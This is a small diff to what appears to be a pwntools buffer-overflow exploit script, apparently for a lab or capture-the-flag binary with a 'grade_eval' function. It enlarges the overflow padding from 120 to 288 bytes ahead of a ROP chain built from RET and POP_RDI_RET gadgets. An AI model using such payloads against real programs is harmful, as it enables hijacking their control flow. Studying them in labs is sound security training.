@@ -13,7 +13,7 @@ RET = 0x4018A5
 grade_eval = 0x401677
 
 payload = (
-    b"A" * 120
+    b"A" * 288
     + p64(RET)
     + p64(POP_RDI_RET)
     + p64(4)
